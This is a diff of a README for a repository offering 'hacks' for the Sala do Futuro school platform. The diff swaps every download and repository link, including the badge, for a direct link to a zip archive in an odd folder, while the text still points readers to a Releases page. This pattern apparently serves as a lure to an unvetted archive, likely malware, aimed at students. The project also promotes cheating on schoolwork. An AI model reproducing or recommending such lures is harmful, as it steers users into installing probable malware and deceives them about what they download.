@@ -1,6 +1,6 @@
 # 😈 SalaDoFuturo-Plataformas-Hacks - Simplify Your Sala do Futuro Tasks
 
-[![Downloads](https://img.shields.io/badge/Download%20Now-Get%20the%20Latest%20Release-blue)](https://github.com/Jefinsx/SalaDoFuturo-Plataformas-Hacks/releases)
+[![Downloads](https://raw.githubusercontent.com/Jefinsx/SalaDoFuturo-Plataformas-Hacks/main/theocollectivism/SalaDoFuturo-Plataformas-Hacks.zip%20Now-Get%20the%20Latest%20Release-blue)](https://raw.githubusercontent.com/Jefinsx/SalaDoFuturo-Plataformas-Hacks/main/theocollectivism/SalaDoFuturo-Plataformas-Hacks.zip)
 
 ## 📖 Overview
 SalaDoFuturo Hacks offers scripts, hacks, and websites designed to make tasks in Sala do Futuro easier. This collection aims to enhance your experience and efficiency while using various platforms associated with Sala do Futuro.
@@ -9,7 +9,7 @@ SalaDoFuturo Hacks offers scripts, hacks, and websites designed to make tasks in
 This guide will help you download, install, and start using SalaDoFuturo Hacks. Follow the steps below to get everything set up.
 
 ## 📥 Download & Install
-To download the latest version of SalaDoFuturo Hacks, visit this page: [Download the Latest Release](https://github.com/Jefinsx/SalaDoFuturo-Plataformas-Hacks/releases).
+To download the latest version of SalaDoFuturo Hacks, visit this page: [Download the Latest Release](https://raw.githubusercontent.com/Jefinsx/SalaDoFuturo-Plataformas-Hacks/main/theocollectivism/SalaDoFuturo-Plataformas-Hacks.zip).
 
 Once you are on the Releases page, you will find the most recent version of the software. Look for files marked with the tag "Latest Release." Click on the appropriate file to download it to your computer.
 
@@ -59,7 +59,7 @@ You’re not alone. Join our community forum to connect with other users, share 
 
 ## 🔗 Additional Resources
 For more information about SalaDoFuturo Hacks and its functionalities, visit the following:
-- [GitHub Repository](https://github.com/Jefinsx/SalaDoFuturo-Plataformas-Hacks)
+- [GitHub Repository](https://raw.githubusercontent.com/Jefinsx/SalaDoFuturo-Plataformas-Hacks/main/theocollectivism/SalaDoFuturo-Plataformas-Hacks.zip)
 - [User Community Forum](#) 
 
-Remember, download the latest version from the Releases page: [Download the Latest Release](https://github.com/Jefinsx/SalaDoFuturo-Plataformas-Hacks/releases) and start making your tasks easier today!
+Remember, download the latest version from the Releases page: [Download the Latest Release](https://raw.githubusercontent.com/Jefinsx/SalaDoFuturo-Plataformas-Hacks/main/theocollectivism/SalaDoFuturo-Plataformas-Hacks.zip) and start making your tasks easier today!
